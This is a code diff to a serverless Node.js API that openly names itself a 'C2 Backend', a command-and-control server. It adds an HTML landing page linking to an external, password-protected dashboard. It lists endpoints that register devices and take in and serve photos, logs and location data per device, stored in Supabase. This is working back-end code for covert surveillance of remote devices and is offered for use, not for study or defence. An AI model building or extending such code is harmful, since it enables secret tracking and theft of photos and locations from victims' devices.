@@ -1,5 +1,5 @@
 // ============================================================
-//  MINIMAL API — NO DASHBOARD, JUST ENDPOINTS
+//  MINIMAL API — WITH DASHBOARD BUTTON
 //  For Vercel Hobby Plan — single function
 // ============================================================
 
@@ -33,7 +33,6 @@ function setCors(res) {
 module.exports = async (req, res) => {
     setCors(res);
 
-    // Handle OPTIONS
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
@@ -42,6 +41,66 @@ module.exports = async (req, res) => {
     const path = url.pathname;
 
     console.log(`[${req.method}] ${path}`);
+
+    // ============================================================
+    //  ROOT — SHOW DASHBOARD BUTTON
+    // ============================================================
+    if (path === '/') {
+        return res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Backend</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:48px 40px;max-width:500px;width:100%;border:1px solid #2a2a44;text-align:center;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
+        .icon{font-size:64px;display:block;margin-bottom:12px}
+        h1{font-size:28px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
+        .sub{color:#8a8aaa;font-size:14px;line-height:1.6;margin-bottom:28px}
+        .btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:16px 32px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;cursor:pointer;text-decoration:none;display:inline-block;transition:transform 0.2s,box-shadow 0.2s;box-shadow:0 8px 24px rgba(247,151,30,0.25)}
+        .btn:hover{transform:scale(1.02);box-shadow:0 12px 36px rgba(247,151,30,0.35)}
+        .btn:active{transform:scale(0.96)}
+        .btn-secondary{background:rgba(42,42,68,0.6);border:1px solid rgba(42,42,68,0.4);color:#e0e0e0;box-shadow:none;margin-top:12px}
+        .btn-secondary:hover{background:rgba(58,58,90,0.8);border-color:#f7971e;box-shadow:none}
+        .endpoints{text-align:left;margin-top:24px;padding:16px;background:rgba(11,11,20,0.5);border-radius:16px;border:1px solid rgba(42,42,68,0.3);font-family:'Courier New',monospace;font-size:12px;color:#4a6a7a;line-height:1.8}
+        .endpoints .highlight{color:#88ccff}
+        .footer{font-size:11px;color:#4a4a6a;margin-top:20px}
+    </style>
+</head>
+<body>
+<div class="card">
+    <span class="icon">☠️</span>
+    <h1>C2 Backend</h1>
+    <p class="sub">Your command & control server is running.</p>
+
+    <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank" class="btn">
+        📊 Open Dashboard
+    </a>
+    <br>
+    <a href="/api/test" class="btn btn-secondary">
+        🔍 Health Check
+    </a>
+
+    <div class="endpoints">
+        <div><span class="highlight">POST</span> /api/register — Register device</div>
+        <div><span class="highlight">POST</span> /api/photo — Upload photo</div>
+        <div><span class="highlight">POST</span> /api/log — Add log</div>
+        <div><span class="highlight">POST</span> /api/location — Add location</div>
+        <div><span class="highlight">POST</span> /api/heartbeat — Heartbeat</div>
+        <div><span class="highlight">GET</span> /api/devices — List devices</div>
+        <div><span class="highlight">GET</span> /api/photos?deviceId=xxx — Get photos</div>
+        <div><span class="highlight">GET</span> /api/logs?deviceId=xxx — Get logs</div>
+        <div><span class="highlight">GET</span> /api/locations?deviceId=xxx — Get locations</div>
+        <div><span class="highlight">GET</span> /api/test — Health check</div>
+    </div>
+
+    <p class="footer">🔐 Dashboard is password protected.</p>
+</div>
+</body>
+</html>
+        `);
+    }
 
     // ============================================================
     //  HEALTH CHECK
@@ -105,7 +164,6 @@ module.exports = async (req, res) => {
         }
 
         try {
-            // Try to upload to Supabase Storage
             let storagePath = null;
             let filePath = null;
 
@@ -115,7 +173,6 @@ module.exports = async (req, res) => {
                 const fileName = `${deviceId}_${Date.now()}.${ext}`;
                 const fileBuffer = Buffer.from(base64Data, 'base64');
 
-                // Try to upload
                 const { error: uploadError } = await supabase
                     .storage
                     .from('photos')
@@ -135,7 +192,6 @@ module.exports = async (req, res) => {
                 console.error('Storage error:', storageErr);
             }
 
-            // Save to database
             const { error: dbError } = await supabase
                 .from('photos')
                 .insert([{
@@ -151,7 +207,6 @@ module.exports = async (req, res) => {
                 return res.status(500).json({ error: dbError.message });
             }
 
-            // Update last_seen
             await supabase
                 .from('devices')
                 .update({ last_seen: Date.now() })
@@ -299,7 +354,6 @@ module.exports = async (req, res) => {
             return res.status(500).json({ error: error.message });
         }
 
-        // Add public URLs
         const result = (data || []).map(p => {
             if (p.storage_path) {
                 const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path);
@@ -361,27 +415,6 @@ module.exports = async (req, res) => {
         }
 
         return res.json(data || []);
-    }
-
-    // ============================================================
-    //  REDIRECT ROOT
-    // ============================================================
-    if (path === '/') {
-        return res.json({
-            message: 'C2 Backend is running',
-            endpoints: [
-                '/api/test - GET - health check',
-                '/api/register - POST - register device',
-                '/api/photo - POST - upload photo',
-                '/api/log - POST - add log',
-                '/api/location - POST - add location',
-                '/api/heartbeat - POST - heartbeat',
-                '/api/devices - GET - list devices',
-                '/api/photos?deviceId=xxx - GET - get photos',
-                '/api/logs?deviceId=xxx - GET - get logs',
-                '/api/locations?deviceId=xxx - GET - get locations'
-            ]
-        });
     }
 
     // ============================================================
